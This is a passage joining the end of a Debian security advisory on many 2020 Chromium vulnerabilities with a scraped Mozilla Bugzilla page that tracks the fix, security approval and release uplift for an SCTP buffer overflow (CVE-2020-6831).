                 CVE-2020-6437 CVE-2020-6438 CVE-2020-6439 CVE-2020-6440
                 CVE-2020-6441 CVE-2020-6442 CVE-2020-6443 CVE-2020-6444
                 CVE-2020-6445 CVE-2020-6446 CVE-2020-6447 CVE-2020-6448
                 CVE-2020-6454 CVE-2020-6455 CVE-2020-6456 CVE-2020-6457
                 CVE-2020-6458 CVE-2020-6459 CVE-2020-6460 CVE-2020-6461
                 CVE-2020-6462 CVE-2020-6463 CVE-2020-6464 CVE-2020-6465
                 CVE-2020-6466 CVE-2020-6467 CVE-2020-6468 CVE-2020-6469
                 CVE-2020-6470 CVE-2020-6471 CVE-2020-6472 CVE-2020-6473
                 CVE-2020-6474 CVE-2020-6475 CVE-2020-6476 CVE-2020-6478
                 CVE-2020-6479 CVE-2020-6480 CVE-2020-6481 CVE-2020-6482
                 CVE-2020-6483 CVE-2020-6484 CVE-2020-6485 CVE-2020-6486
                 CVE-2020-6487 CVE-2020-6488 CVE-2020-6489 CVE-2020-6490
                 CVE-2020-6491 CVE-2020-6493 CVE-2020-6494 CVE-2020-6495
                 CVE-2020-6496 CVE-2020-6497 CVE-2020-6498 CVE-2020-6505
                 CVE-2020-6506 CVE-2020-6507 CVE-2020-6509 CVE-2020-6831

Several vulnerabilities have been discovered in the chromium web browser.

CVE-2020-6423

    A use-after-free issue was found in the audio implementation.

CVE-2020-6430

    Avihay Cohen discovered a type confusion issue in the v8 javascript
    library.

CVE-2020-6431

    Luan Herrera discovered a policy enforcement error.

CVE-2020-6432

    Luan Herrera discovered a policy enforcement error.

CVE-2020-6433

    Luan Herrera discovered a policy enforcement error in extensions.

CVE-2020-6434

    HyungSeok Han discovered a use-after-free issue in the developer tools.

CVE-2020-6435

    Sergei Glazunov discovered a policy enforcement error in extensions.

CVE-2020-6436

    Igor Bukanov discovered a use-after-free issue.

CVE-2020-6437

    Jann Horn discovered an implementation error in WebView.

CVE-2020-6438

    Ng Yik Phang discovered a policy enforcement error in extensions.

CVE-2020-6439

    remkoboonstra discovered a policy enforcement error.

CVE-2020-6440

    David Erceg discovered an implementation error in extensions.

CVE-2020-6441

    David Erceg discovered a policy enforcement error.

CVE-2020-6442

    B@rMey discovered an implementation error in the page cache.

CVE-2020-6443

    @lovasoa discovered an implementation error in the developer tools.

CVE-2020-6444

    mlfbrown discovered an uninitialized variable in the WebRTC
    implementation.

CVE-2020-6445

    Jun Kokatsu discovered a policy enforcement error.

CVE-2020-6446

    Jun Kokatsu discovered a policy enforcement error.

CVE-2020-6447

    David Erceg discovered an implementation error in the developer tools.

CVE-2020-6448

    Guang Gong discovered a use-after-free issue in the v8 javascript library.

CVE-2020-6454

    Leecraso and Guang Gong discovered a use-after-free issue in extensions.

CVE-2020-6455

    Nan Wang and Guang Gong discovered an out-of-bounds read issue in the
    WebSQL implementation.

CVE-2020-6456

    Michał Bentkowski discovered insufficient validation of untrusted input.

CVE-2020-6457

    Leecraso and Guang Gong discovered a use-after-free issue in the speech
    recognizer.

CVE-2020-6458

    Aleksandar Nikolic discoved an out-of-bounds read and write issue in the
    pdfium library.

CVE-2020-6459

    Zhe Jin discovered a use-after-free issue in the payments implementation.

CVE-2020-6460

    It was discovered that URL formatting was insufficiently validated.

CVE-2020-6461

    Zhe Jin discovered a use-after-free issue.

CVE-2020-6462

    Zhe Jin discovered a use-after-free issue in task scheduling.

CVE-2020-6463

    Pawel Wylecial discovered a use-after-free issue in the ANGLE library.

CVE-2020-6464

    Looben Yang discovered a type confusion issue in Blink/Webkit.

CVE-2020-6465

    Woojin Oh discovered a use-after-free issue.

CVE-2020-6466

    Zhe Jin discovered a use-after-free issue.

CVE-2020-6467

    ZhanJia Song discovered a use-after-free issue in the WebRTC
    implementation.

CVE-2020-6468

    Chris Salls and Jake Corina discovered a type confusion issue in the v8
    javascript library.

CVE-2020-6469

    David Erceg discovered a policy enforcement error in the developer tools.

CVE-2020-6470

    Michał Bentkowski discovered insufficient validation of untrusted input.

CVE-2020-6471

    David Erceg discovered a policy enforcement error in the developer tools.

CVE-2020-6472

    David Erceg discovered a policy enforcement error in the developer tools.

CVE-2020-6473

    Soroush Karami and Panagiotis Ilia discovered a policy enforcement error
    in Blink/Webkit.

CVE-2020-6474

    Zhe Jin discovered a use-after-free issue in Blink/Webkit.

CVE-2020-6475

    Khalil Zhani discovered a user interface error.

CVE-2020-6476

    Alexandre Le Borgne discovered a policy enforcement error.

CVE-2020-6478

    Khalil Zhani discovered an implementation error in full screen mode.

CVE-2020-6479

    Zhong Zhaochen discovered an implementation error.

CVE-2020-6480

    Marvin Witt discovered a policy enforcement error.

CVE-2020-6481

    Rayyan Bijoora discovered a policy enforcement error.

CVE-2020-6482

    Abdulrahman Alqabandi discovered a policy enforcement error in the
    developer tools.

CVE-2020-6483

    Jun Kokatsu discovered a policy enforcement error in payments.

CVE-2020-6484

    Artem Zinenko discovered insufficient validation of user data in the
    ChromeDriver implementation.

CVE-2020-6485

    Sergei Glazunov discovered a policy enforcement error.

CVE-2020-6486

    David Erceg discovered a policy enforcement error.

CVE-2020-6487

    Jun Kokatsu discovered a policy enforcement error.

CVE-2020-6488

    David Erceg discovered a policy enforcement error.

CVE-2020-6489

    @lovasoa discovered an implementation error in the developer tools.

CVE-2020-6490

    Insufficient validation of untrusted data was discovered.

CVE-2020-6491

    Sultan Haikal discovered a user interface error.

CVE-2020-6493

    A use-after-free issue was discovered in the WebAuthentication
    implementation.

CVE-2020-6494

    Juho Nurimen discovered a user interface error.

CVE-2020-6495

    David Erceg discovered a policy enforcement error in the developer tools.

CVE-2020-6496

    Khalil Zhani discovered a use-after-free issue in payments.

CVE-2020-6497

    Rayyan Bijoora discovered a policy enforcement issue.

CVE-2020-6498

    Rayyan Bijoora discovered a user interface error.

CVE-2020-6505

    Khalil Zhani discovered a use-after-free issue.

CVE-2020-6506

    Alesandro Ortiz discovered a policy enforcement error.

CVE-2020-6507

    Sergei Glazunov discovered an out-of-bounds write issue in the v8
    javascript library.

CVE-2020-6509

    A use-after-free issue was discovered in extensions.

CVE-2020-6831

    Natalie Silvanovich discovered a buffer overflow issue in the SCTP
    library.

For the oldstable distribution (stretch), security support for chromium
has been discontinued.

For the stable distribution (buster), these problems have been fixed in
version 83.0.4103.116-1~deb10u1.

We recommend that you upgrade your chromium packages.

For the detailed security status of chromium please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/chromium>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://www.debian.org/security/>

Mailing list: debian-security-announce@lists.debian.org
-----BEGIN PGP SIGNATURE-----

iQQzBAEBCgAdFiEEIwTlZiOEpzUxIyp4mD40ZYkUaygFAl79PrwACgkQmD40ZYkU
ayj+4yAAlij5zApfa++eXf4kRR0DaDUSLH20zppWCPo4Qj3MPsQFJ3F7onHl/aYS
QATCCzF+ZcA7c6Dw2k4fLv/+UNhI6FS1uioddeF8NWDantMu1xVxBsesGJTUiJk8
OatCzBXdhSF4Zr8VCNW6YsIoj2DKEY6e1bzjMxhzEWYzRDcX9pHbUZHX92b34A2M
VlnLdlPhfheiHxwlo6oaIGyDIZfjmCqTmlgv8RsxgGXn6OhfqL0MIMeirZLW6qJO
Pr/b2R35gN2jZkKvpJ/7m4rplwdN814Eo0dzkHXyry9VlhtRCxswYGfOkwDcZ6C4
/cESMESZime1B1Vq+Y1Ip9OhPj6hFY8zdwm56WNJPIHx97SH4dMfzNWpqGv+1dKN
6gQFUPeM0eTJr5wLb4lZJDx7DA3ioXbotmN/bb9PnIRI6pSVVZ2jXp6QRLpO0UmL
Akc/JkyMy3woVRkdy1tRN64YnvLeJZGUpL4aPykvkS6tgv5Kh9HD04B7BOHQl0HO
z3CAPdwA0rE2wXF0oHgDMgdf6GucfV5xIUHUDdpqpFmQWRHGjaKvD25CVn35FXmf
/YSs8VAK+EGqvXbhWhs6rxLaZ2DxmhCMyQ6RxnQ8BtAtvdGQ/r9h+yUzUJK3+NOo
8M67ADHz/bN2Iw4yQ57Bscq0bG6JlQ/2xEhu17cer2nw2X3cklckI6GaoRCIl/+M
6JHsTqQ1vNKlcLB8rwpJY2APfJHWR2el07VrCsk6h/Ojn0E9aSAhQiyaEoy3Eh1E
GafVuMPEgy2AzAOIhG6F1Kglt+S9SlaGFo0VDU00E4Fs0o/h1Wlu3/Goorpfz1qj
ZKvodZ1lDWbb2fhVMGOX3kTSHIWwnDoYv7zZXLvPSmMr7+TpVLLu4RrYPzBhaFYo
S3MMtYt7ZkVUufidT7dYb+E5QMjx2h7V2lQ6AaLAbLR9sjfpjqYQ+LNbhoMYo4US
MVT5c9Gw9v3jLPwD2N9K7stngpAISMyAEdXNwUMcGCaqhAiU3mo4s7/kFkKugyMA
NHt8oAsR6FZr9TNNrV4GX5HSsMpaYQIEMtyfi27UHlnEFEMteTjLi2aaK9Qg5LSX
qSqArjx4uzPL/YQx1bbm58NkQsJ6eNSYw3U1OFnEr5xhygFeb8qZ4HYuGc/Yzq29
j63tAshrWOu10I6DpZ8CjfI8VAv6xRkocW1oX9upEAP4E65iBzQiPbTQUZOexckt
iXd0dR4zHwfnzYpaVO+0hqf2z8NbkHZ3J9/3xrwmFqz0fKeLvBlMCnFIJo3elayN
uVnWN49zfreVQEE+NWjbEq2ScPygfYDrxc+nR6tZevlgLFvFTM3K2IwUMb8gnAS9
wcrW+6H7AjxgM4bKEC0Uy/7gThkVDw==
=15jh
-----END PGP SIGNATURE-----

```

---



=== Content from bugzilla.mozilla.org_eb54f25d_20250119_122047.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1632241)
* [XML](/show_bug.cgi?ctype=xml&id=1632241)

Closed
[Bug 1632241](/show_bug.cgi?id=1632241)
(CVE-2020-6831)

Opened 5 years ago
Closed 5 years ago

# Buffer overflow in sctp chunk input validation

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

Buffer overflow in sctp chunk input validation

## Categories

### (Core :: WebRTC: Networking, defect)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=WebRTC%3A%20Networking#WebRTC%3A%20Networking)

WebRTC: Networking
▾

Core :: WebRTC: Networking
Bugs in the networking portions of WebRTC (PeerConnection dataChannels, SCTP, DTLS, SRTP, ICE, TURN, STUN, etc)
[See Open Bugs in This Component](/buglist.cgi?product=Core&component=WebRTC%3A%20Networking&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=WebRTC%3A%20Networking&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=WebRTC%3A%20Networking)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

unspecified

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

--

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

mozilla77

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| a11y-review | --- |
| --- | --- |
| Webcompat Priority | --- |
| Accessibility Severity | --- |
| Performance Impact | --- |
| Webcompat Score | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr68 | [76+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=76%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=fixed) |
| firefox75 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox75&o1=equals&v1=wontfix) |
| firefox76 | [+](/buglist.cgi?f1=cf_tracking_firefox76&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox76&o1=equals&v1=fixed) |
| firefox77 | [+](/buglist.cgi?f1=cf_tracking_firefox77&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox77&o1=equals&v1=fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr68 | 76+ | fixed |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox75 |  | wontfix |
| firefox76 | + | fixed |
| firefox77 | + | fixed |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: drno, Assigned: drno)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/159425d442d005ace16b6bdfec9bcf31?d=mm&size=40)  [drno](/user_profile?user_id=489581)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/159425d442d005ace16b6bdfec9bcf31?d=mm&size=40)  [drno](/user_profile?user_id=489581)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/3e201149abea356acc9bb6f0eea8b5a0?d=mm&size=40)  [bwc](/user_profile?user_id=478411)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

8 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[bugs.chromium.org/p/chromium/issues/d...](https://bugs.chromium.org/p/chromium/issues/detail?id=1073602 "https://bugs.chromium.org/p/chromium/issues/detail?id=1073602")

## Details

### (Keywords: csectype-bounds, sec-high, Whiteboard: [reported by GPZ, disclosure date 2020-07-18][post-critsmash-triage][adv-main76+][adv-ESR68.8+])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2020-6831

[Keywords:](/describekeywords.cgi)

[csectype-bounds](/buglist.cgi?keywords=csectype-bounds&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[reported by GPZ, disclosure date 2020-07-18][post-critsmash-triage][adv-main76+][adv-ESR68.8+]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [noni](/user_profile?user_id=458186) | [qe-verify](#a485355_458186 "5 years ago") | - |
| --- | --- | --- |
| [noni](/user_profile?user_id=458186) | qe-verify | - |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty | ? |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (3 files)

| [Bug 1632241: add SCTP auth token boundary check](/attachment.cgi?id=9142549)  [5 years ago](#c1)  [Nils Ohlmeier [:drno]](/user_profile?user_id=489581)   47 bytes, text/x-phabricator-request | dveditz : [approval-mozilla-beta+](#c6 "5 years ago")  RyanVM : [approval-mozilla-esr68+](#c11 "5 years ago")  dveditz : [sec-approval+](#c6 "5 years ago") | [Details](/attachment.cgi?id=9142549&action=edit) | [Review](/attachment.cgi?id=9142549) |
| --- | --- | --- |
| [Bug 1632241: turn off SCTP auth and address reconfiguration](/attachment.cgi?id=9142556)  [5 years ago](#c2)  [Nils Ohlmeier [:drno]](/user_profile?user_id=489581)   47 bytes, text/x-phabricator-request | dveditz : [approval-mozilla-beta+](#a45247_1689 "5 years ago")  RyanVM : [approval-mozilla-esr68+](#a106230_75935 "5 years ago")  dveditz : [sec-approval+](#a45247_1689 "5 years ago") | [Details](/attachment.cgi?id=9142556&action=edit) | [Review](/attachment.cgi?id=9142556) |
| [advisory.txt](/attachment.cgi?id=9144315)  [5 years ago](#c13)  [Frederik Braun [:freddy]](/user_profile?user_id=428608)   254 bytes, text/plain |  | [Details](/attachment.cgi?id=9144315&action=edit) |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Nils Ohlmeier [:drno]](/user_profile?user_id=489581)  Assignee |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1632241#c0)• 5 years ago |
|  | |

Upstream usrsctp has been notified about a buffer overflow in their implementation.

The patch for it is available upstream here <https://github.com/sctplab/usrsctp/commit/e1dd9bea4f438abf4d4c3b658f1db8f013157184>

Alternatively we could work around the problematic code path by disabling SCTP authentication with the following (as that feature isn't used in webrtc any way):

usrsctp\_sysctl\_set\_sctp\_asconf\_enable(0);

usrsctp\_sysctl\_set\_sctp\_auth\_enable(0);

|  | [Nils Ohlmeier [:drno]](/user_profile?user_id=489581)  Assignee |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1632241#c1)• 5 years ago |
|  | |

Attached file
[Bug 1632241: add SCTP auth token boundary check](attachment.cgi?id=9142549)
— [Details](attachment.cgi?id=9142549&action=edit)

|  | [Nils Ohlmeier [:drno]](/user_profile?user_id=489581)  Assignee |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1632241#c2)• 5 years ago |
|  | |

Attached file
[Bug 1632241: turn off SCTP auth and address reconfiguration](attachment.cgi?id=9142556)
— [Details](attachment.cgi?id=9142556&action=edit)

Depends on D72053

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1632241#a17471_1689)• 5 years ago |

Group: core-security → media-core-security
[status-firefox75](/buglist.cgi?f1=cf_status_firefox75&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox75&o1=equals&v1=wontfix)
[status-firefox76](/buglist.cgi?f1=cf_status_firefox76&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox76&o1=equals&v1=affected)
[status-firefox77](/buglist.cgi?f1=cf_status_firefox77&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox77&o1=equals&v1=affected)
[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected)
[tracking-firefox76](/buglist.cgi?f1=cf_tracking_firefox76&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox76&o1=equals&v1=%2B)
[tracking-firefox77](/buglist.cgi?f1=cf_tracking_firefox77&o1=isnotempty):
--- → [+](/buglist.cgi?f1=cf_tracking_firefox77&o1=equals&v1=%2B)
[tracking-firefox-esr68](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=isnotempty):
--- → [76+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=76%2B)Keywords: [csectype-bounds](/buglist.cgi?keywords=csectype-bounds&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---)Whiteboard: [reported by GPZ, unknown disclosure date]

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1632241#c3)• 5 years ago |
|  | |

Public commit doesn't literally say "SECURITY BUG!" but it does thank a prominent member of Google Project Zero. We should get a fix into 76 and ESR. Nils suggests using the the "turn it off" patch for uplift. I wouldn't mind taking both!

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1632241#c4)• 5 years ago |
|  | |

We're building RCs on Monday, so patches will need to be reviewed and land ASAP to make it into 76/68.8.

|  | [Phabricator Automation](/user_profile?user_id=600971) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1632241#a37461_600971)• 5 years ago |

Assignee: nobody → drnoStatus: NEW → ASSIGNED

|  | [Nils Ohlmeier [:drno]](/user_profile?user_id=489581)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1632241#a37998_489581)• 5 years ago |

Whiteboard: [reported by GPZ, unknown disclosure date] → [reported by GPZ, disclosure date 2020-07-18]

|  | [Nils Ohlmeier [:drno]](/user_profile?user_id=489581)  Assignee |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1632241#c5)• 5 years ago |
|  | |

Comment on [attachment 9142549](/attachment.cgi?id=9142549 "Bug 1632241: add SCTP auth token boundary check") [[details]](/attachment.cgi?id=9142549&action=edit "Bug 1632241: add SCTP auth token boundary check")

[Bug 1632241](/show_bug.cgi?id=1632241 "RESOLVED FIXED - Buffer overflow in sctp chunk input validation"): add SCTP auth token boundary check

### Security Approval Request

* **How easily could an exploit be constructed based on the patch?**: Not very hard with knowledge on how WebRTC data channel works.
* **Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?**: No
* **Which older supported branches are affected by this flaw?**: all
* **If not all supported branches, which bug introduced the flaw?**: None
* **Do you have backports for the affected branches?**: Yes
* **If not, how different, hard to create, and risky will they be?**:
* **How likely is this patch to cause regressions; how much testing does it need?**: Not very likely as the affected code paths normally should not be triggered by normal WebRTC endpoints.
[Attachment #9142549](/attachment.cgi?id=9142549&action=edit "Bug 1632241: add SCTP auth token boundary check") -
Flags: sec-approval?

|  | [Nils Ohlmeier [:drno]](/user_profile?user_id=489581)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1632241#a38762_489581)• 5 years ago |

[Attachment #9142556](/attachment.cgi?id=9142556&action=edit "Bug 1632241: turn off SCTP auth and address reconfiguration") -
Flags: sec-approval?

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1632241#a45247_1689)• 5 years ago |

[Attachment #9142556](/attachment.cgi?id=9142556&action=edit "Bug 1632241: turn off SCTP auth and address reconfiguration") -
Flags: sec-approval?
[Attachment #9142556](/attachment.cgi?id=9142556&action=edit "Bug 1632241: turn off SCTP auth and address reconfiguration") -
Flags: sec-approval+
[Attachment #9142556](/attachment.cgi?id=9142556&action=edit "Bug 1632241: turn off SCTP auth and address reconfiguration") -
Flags: approval-mozilla-beta+

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1632241#c6)• 5 years ago |
|  | |

Comment on [attachment 9142549](/attachment.cgi?id=9142549 "Bug 1632241: add SCTP auth token boundary check") [[details]](/attachment.cgi?id=9142549&action=edit "Bug 1632241: add SCTP auth token boundary check")

[Bug 1632241](/show_bug.cgi?id=1632241 "RESOLVED FIXED - Buffer overflow in sctp chunk input validation"): add SCTP auth token boundary check

sec-approval+ and a=dveditz for beta uplift.

[Attachment #9142549](/attachment.cgi?id=9142549&action=edit "Bug 1632241: add SCTP auth token boundary check") -
Flags: sec-approval?
[Attachment #9142549](/attachment.cgi?id=9142549&action=edit "Bug 1632241: add SCTP auth token boundary check") -
Flags: sec-approval+
[Attachment #9142549](/attachment.cgi?id=9142549&action=edit "Bug 1632241: add SCTP auth token boundary check") -
Flags: approval-mozilla-beta+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1632241#c7)• 5 years ago |
|  | |

<https://hg.mozilla.org/integration/autoland/rev/b277e280752ea2fa583cb901ee8b4c175d1313bd>

<https://hg.mozilla.org/integration/autoland/rev/685b6848524821b77d8d4aa0e11f9c2d35a76a1e>

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1632241#c8)• 5 years ago |
| uplift | |

Fixed in 76.0b8.

<https://hg.mozilla.org/releases/mozilla-beta/rev/35616be71c33>

<https://hg.mozilla.org/releases/mozilla-beta/rev/e3b02434661a>

[status-firefox76](/buglist.cgi?f1=cf_status_firefox76&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox76&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox76&o1=equals&v1=fixed)

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1632241#c9)• 5 years ago |
|  | |

<https://hg.mozilla.org/mozilla-central/rev/b277e280752e>

<https://hg.mozilla.org/mozilla-central/rev/685b68485248>

Group: media-core-security → core-security-releaseStatus: ASSIGNED → RESOLVEDClosed: 5 years ago
[status-firefox77](/buglist.cgi?f1=cf_status_firefox77&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox77&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox77&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → mozilla77

|  | [Nils Ohlmeier [:drno]](/user_profile?user_id=489581)  Assignee |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1632241#c10)• 5 years ago |
|  | |

Comment on [attachment 9142549](/attachment.cgi?id=9142549 "Bug 1632241: add SCTP auth token boundary check") [[details]](/attachment.cgi?id=9142549&action=edit "Bug 1632241: add SCTP auth token boundary check")

[Bug 1632241](/show_bug.cgi?id=1632241 "RESOLVED FIXED - Buffer overflow in sctp chunk input validation"): add SCTP auth token boundary check

### ESR Uplift Approval Request

* **If this is not a sec:{high,crit} bug, please state case for ESR consideration**: It is sec-high
* **User impact if declined**: Users would be exposed to the technically possible drive-by buffer overflow.
* **Fix Landed on Version**: 76
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: The risk is low, because the buffer overflow is on a code path which is normally not used in WebRTC. That means only a specifically crafted PeerConnection endpoints which sends packets which are normally not send as part of WebRTC connection could trigger this.
* **String or UUID changes made by this patch**: N/A
[Attachment #9142549](/attachment.cgi?id=9142549&action=edit "Bug 1632241: add SCTP auth token boundary check") -
Flags: approval-mozilla-esr68?

|  | [Nils Ohlmeier [:drno]](/user_profile?user_id=489581)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1632241#a100804_489581)• 5 years ago |

[Attachment #9142556](/attachment.cgi?id=9142556&action=edit "Bug 1632241: turn off SCTP auth and address reconfiguration") -
Flags: approval-mozilla-esr68?

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1632241#c11)• 5 years ago |
|  | |

Comment on [attachment 9142549](/attachment.cgi?id=9142549 "Bug 1632241: add SCTP auth token boundary check") [[details]](/attachment.cgi?id=9142549&action=edit "Bug 1632241: add SCTP auth token boundary check")

[Bug 1632241](/show_bug.cgi?id=1632241 "RESOLVED FIXED - Buffer overflow in sctp chunk input validation"): add SCTP auth token boundary check

Approved for 68.8esr.

